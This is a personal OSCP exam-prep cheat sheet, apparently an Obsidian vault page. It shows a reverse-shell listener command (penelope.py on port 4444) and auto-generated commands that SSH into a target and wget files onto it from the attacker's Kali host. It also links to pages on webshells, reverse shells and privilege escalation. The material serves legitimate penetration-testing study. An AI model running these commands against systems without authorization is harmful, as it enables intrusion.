[[0 Port Number Table]]

Listener

```
cd ~/Desktop/Tools && python3 penelope.py -p 4444 -O / --oscp-safe
```

SSH
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `ssh [user]@${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
wget from local python server
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `wget http://${KaliIP}:8888/[file]`;

dv.paragraph("```bash\n" + command + "\n```");
```

---
## Hunting User Machine Access

#### Web
[[Web Requests API]]
[[0000027|URL Webshell]]

[[Reverse Shell Resources]]

[[4 Shell Upgrade|Shell Upgrade]]

---
## User Machine Access

 [[Synced OSCP Notes/Small Toolkit/Tools/Hashcat|Hashcat]]

---
## Hunting Root

#### Priv Esc

[[Search Credentials and Files]]

[[Root Methods]]